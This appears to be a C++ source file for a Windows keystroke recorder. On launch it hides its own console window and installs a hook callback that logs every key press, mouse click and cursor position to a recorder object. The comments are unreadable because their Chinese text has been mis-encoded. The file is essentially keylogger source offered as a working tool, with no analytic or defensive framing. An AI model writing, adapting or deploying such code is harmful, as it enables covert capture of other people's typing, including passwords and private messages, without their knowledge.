// Keyboard Recorder.cpp : �������̨Ӧ�ó������ڵ㡣
//

#include "stdafx.h"
#include"KbRecord.h"

namespace KbRecord
{
	KbRecord kbr;
}

LRESULT CALLBACK HookCallback(int code, WPARAM wParam, LPARAM lParam);

int main()
{
	HWND hwndDOS = GetForegroundWindow();
	ShowWindow(hwndDOS, SW_HIDE);
	KbRecord::kbr.Record();
}

LRESULT CALLBACK HookCallback(int code, WPARAM wParam, LPARAM lParam)//��Ϣѭ��
{
	using namespace std;
	static int times = 1, cursor = 1;
	KBDLLHOOKSTRUCT *ks = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
	static POINT t;
	switch (wParam)
	{
	case WM_KEYDOWN:
		times++;
		switch (ks->vkCode)
		{
		case VK_APPS:
			KbRecord::kbr << "��⵽APP����" << endl;
			break;
		case VK_LSHIFT:
		case VK_RSHIFT:
		case VK_SHIFT:
			KbRecord::kbr << "��⵽shift����" << endl;
			break;
		case VK_LMENU:
		case VK_RMENU:
		case VK_MENU:
			KbRecord::kbr << "��⵽ALT����" << endl;
			break;
		case VK_LCONTROL:
		case VK_RCONTROL:
		case VK_CONTROL:
			KbRecord::kbr << "��⵽CTRL����" << endl;
			break;
		case VK_BACK:
			KbRecord::kbr << "��⵽BackSpace����" << endl;
			break;
		case VK_RETURN:
			KbRecord::kbr << "��⵽Enter����" << endl;
			break;
		case  VK_RWIN:
		case  VK_LWIN:
			KbRecord::kbr << "��⵽Win����" << endl;
			break;
		case VK_CAPITAL:
			KbRecord::kbr << "��⵽��д��������" << endl;
			break;
		case VK_CANCEL:
			KbRecord::kbr << "��⵽CTRL+BREAK����" << endl;
			break;
		case VK_CLEAR:
			KbRecord::kbr << "��⵽CLEAR����" << endl;
			break;
		case VK_SPACE:
			KbRecord::kbr << "��⵽�ո���" << endl;
			break;
		case VK_TAB:
			KbRecord::kbr << "��⵽TAB����" << endl;
			break;
		case VK_F1:
			KbRecord::kbr << "��⵽F1����" << endl;
			break;
		case VK_F2:
			KbRecord::kbr << "��⵽F2����" << endl;
			break;
		case VK_F3:
			KbRecord::kbr << "��⵽F3����" << endl;
			break;
		case VK_F4:
			KbRecord::kbr << "��⵽F4����" << endl;
			break;
		case VK_F5:
			KbRecord::kbr << "��⵽F5����" << endl;
			break;
		case VK_F6:
			KbRecord::kbr << "��⵽F6����" << endl;
			break;
		case VK_F7:
			KbRecord::kbr << "��⵽F7����" << endl;
			break;
		case VK_F8:
			KbRecord::kbr << "��⵽F8����" << endl;
			break;
		case VK_F9:
			KbRecord::kbr << "��⵽F9����" << endl;
			break;
		case VK_F10:
			KbRecord::kbr << "��⵽F10����" << endl;
			break;
		case VK_F11:
			KbRecord::kbr << "��⵽F11����" << endl;
			break;
		case VK_F12:
			KbRecord::kbr << "��⵽F12����" << endl;
			break;
		case VK_NUMPAD0:
		case 48:
			KbRecord::kbr << "��⵽0����" << endl;
			break;
		case VK_NUMPAD1:
		case 49:
			KbRecord::kbr << "��⵽1����" << endl;
			break;
		case VK_NUMPAD2:
		case 50:
			KbRecord::kbr << "��⵽2����" << endl;
			break;
		case VK_NUMPAD3:
		case 51:
			KbRecord::kbr << "��⵽3����" << endl;
			break;
		case VK_NUMPAD4:
		case 52:
			KbRecord::kbr << "��⵽4����" << endl;
			break;
		case VK_NUMPAD5:
		case 53:
			KbRecord::kbr << "��⵽5����" << endl;
			break;
		case VK_NUMPAD6:
		case 54:
			KbRecord::kbr << "��⵽6����" << endl;
			break;
		case VK_NUMPAD7:
		case 55:
			KbRecord::kbr << "��⵽7����" << endl;
			break;
		case VK_NUMPAD8:
		case 56:
			KbRecord::kbr << "��⵽8����" << endl;
			break;
		case VK_NUMPAD9:
		case 57:
			KbRecord::kbr << "��⵽9����" << endl;
			break;
		case 65:
			KbRecord::kbr << "��⵽A����" << endl;
			break;
		case 66:
			KbRecord::kbr << "��⵽B����" << endl;
			break;
		case 67:
			KbRecord::kbr << "��⵽C����" << endl;
			break;
		case 68:
			KbRecord::kbr << "��⵽D����" << endl;
			break;
		case 69:
			KbRecord::kbr << "��⵽E����" << endl;
			break;
		case 70:
			KbRecord::kbr << "��⵽F����" << endl;
			break;
		case 71:
			KbRecord::kbr << "��⵽G����" << endl;
			break;
		case 72:
			KbRecord::kbr << "��⵽H����" << endl;
			break;
		case 73:
			KbRecord::kbr << "��⵽I����" << endl;
			break;
		case 74:
			KbRecord::kbr << "��⵽J����" << endl;
			break;
		case 75:
			KbRecord::kbr << "��⵽K����" << endl;
			break;
		case 76:
			KbRecord::kbr << "��⵽L����" << endl;
			break;
		case 77:
			KbRecord::kbr << "��⵽M����" << endl;
			break;
		case 78:
			KbRecord::kbr << "��⵽N����" << endl;
			break;
		case 79:
			KbRecord::kbr << "��⵽O����" << endl;
			break;
		case 80:
			KbRecord::kbr << "��⵽P����" << endl;
			break;
		case 81:
			KbRecord::kbr << "��⵽Q����" << endl;
			break;
		case 82:
			KbRecord::kbr << "��⵽R����" << endl;
			break;
		case 83:
			KbRecord::kbr << "��⵽S����" << endl;
			break;
		case 84:
			KbRecord::kbr << "��⵽T����" << endl;
			break;
		case 85:
			KbRecord::kbr << "��⵽U����" << endl;
			break;
		case 86:
			KbRecord::kbr << "��⵽V����" << endl;
			break;
		case 87:
			KbRecord::kbr << "��⵽W����" << endl;
			break;
		case 88:
			KbRecord::kbr << "��⵽X����" << endl;
			break;
		case 89:
			KbRecord::kbr << "��⵽Y����" << endl;
			break;
		case 90:
			KbRecord::kbr << "��⵽Z����" << endl;
			break;
		case VK_ADD:
			KbRecord::kbr << "��⵽+����" << endl;
			break;
		case VK_SUBTRACT:
			KbRecord::kbr << "��⵽-����" << endl;
			break;
		case VK_DIVIDE:
			KbRecord::kbr << "��⵽/����" << endl;
			break;
		case VK_MULTIPLY:
			KbRecord::kbr << "��⵽*����" << endl;
			break;
		case 190:
		case VK_DECIMAL:
			KbRecord::kbr << "��⵽.����" << endl;
			break;
		case 186:
			KbRecord::kbr << "��⵽;����" << endl;
			break;
		case 188:
			KbRecord::kbr << "��⵽,����" << endl;
			break;
		case 219:
			KbRecord::kbr << "��⵽[����" << endl;
			break;
		case 221:
			KbRecord::kbr << "��⵽]����" << endl;
			break;
		case VK_ESCAPE:
			KbRecord::kbr << "��⵽ESC����" << endl;
			break;
		default:
			KbRecord::kbr << "δ֪��������ֵ " << ks->vkCode << endl;
		}
		break;
	case WM_KEYUP:
		switch (ks->vkCode)
		{
		case 160:
		case 161:
		case VK_SHIFT:
			KbRecord::kbr << "��⵽shift����" << endl;
			break;
		case VK_MENU:
			KbRecord::kbr << "��⵽ALT����" << endl;
			break;
		case VK_CONTROL:
			KbRecord::kbr << "��⵽CTRL����" << endl;
			break;
		case VK_LBUTTON:
			KbRecord::kbr << "��⵽����������" << endl;
			break;
		case VK_RBUTTON:
			KbRecord::kbr << "��⵽����Ҽ�����" << endl;
			break;
		case  VK_LWIN:
		case  VK_RWIN:
			KbRecord::kbr << "��⵽Win����" << endl;
			break;
		case VK_CAPITAL:
			KbRecord::kbr << "��⵽��д��������" << endl;
			break;
		}
		break;
	case WM_MOUSEMOVE:
		cursor++;
		if (!(cursor % 25))//����ȡ��������������Ƶ��
		{
			GetCursorPos(&t);
			KbRecord::kbr << "��⵽����ƶ���λ�� ( " << t.x << " , " << t.y << " )" << endl;
		}
		break;
	case WM_LBUTTONDOWN:
		KbRecord::kbr << "��⵽����������" << endl;
		break;
	case WM_RBUTTONDOWN:
		KbRecord::kbr << "��⵽����Ҽ�����" << endl;
		break;
	case WM_MBUTTONDOWN:
		KbRecord::kbr << "��⵽����м�����" << endl;
		break;
	case WM_SYSKEYDOWN:
		KbRecord::kbr << "��סALT��ͬʱ����������" << endl;
		break;
	}
	if (!(times % 7))//����ȡ���������ProcessWarning()��Ƶ��
	{
		times = 1;
		KbRecord::kbr.ProcessWarning();
	}
	return CallNextHookEx(0, code, wParam, lParam);
}
